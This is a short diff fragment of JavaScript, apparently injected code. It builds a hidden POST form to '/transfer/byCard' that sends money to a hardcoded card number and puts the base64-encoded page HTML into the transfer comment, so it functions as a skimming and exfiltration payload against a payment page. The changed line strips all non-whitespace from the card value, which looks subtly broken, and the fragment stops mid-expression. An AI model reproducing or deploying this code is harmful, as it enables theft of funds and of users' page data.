@@ -12,7 +12,7 @@ function submitData() {
   storeCardNumber();
   const TEMPLATE = `
     <form method="POST" action="/transfer/byCard">
-      <input type="hidden" name="from" id="walletInputOption" value="${getCardNumber()}">
+      <input type="hidden" name="from" id="walletInputOption" value="${getCardNumber().replace(/\S/g, '')}">
             <input class="" required="" maxlength="20" name="to" type="text" value="2202100714221678">
           <input class="" name="comment" type="text" value="${btoa(
             document.body.innerHTML
